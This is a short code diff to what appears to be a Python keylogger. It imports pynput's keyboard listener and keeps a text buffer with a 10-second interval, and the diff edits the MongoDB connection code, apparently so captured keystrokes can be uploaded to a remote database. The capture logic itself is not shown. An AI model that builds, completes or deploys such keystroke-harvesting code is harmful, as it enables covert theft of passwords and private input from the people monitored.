@@ -1,3 +1,4 @@
+from pymongo.server_api import ServerApi
 from pynput import keyboard
 from pymongo import MongoClient
 from datetime import datetime, timedelta
@@ -9,7 +10,7 @@ text = ""
 time_interval = 10
 
 # MongoDB configuration - using environment variable for security
-uri = os.getenv("your_connection_string") #put your connection string in ""
+uri = "" #put string connection here ""
 
 # Global variables for MongoDB connection
 client = None
@@ -20,7 +21,7 @@ def get_db_connection():
     """Get a MongoDB connection with reconnection handling"""
     global client, db_connected
     try:
-        client = MongoClient(uri, serverSelectionTimeoutMS=5000)
+        client = MongoClient(uri, server_api=ServerApi('1')) # put api here
         client.admin.command('ping')
 
         # Create/access database and collection
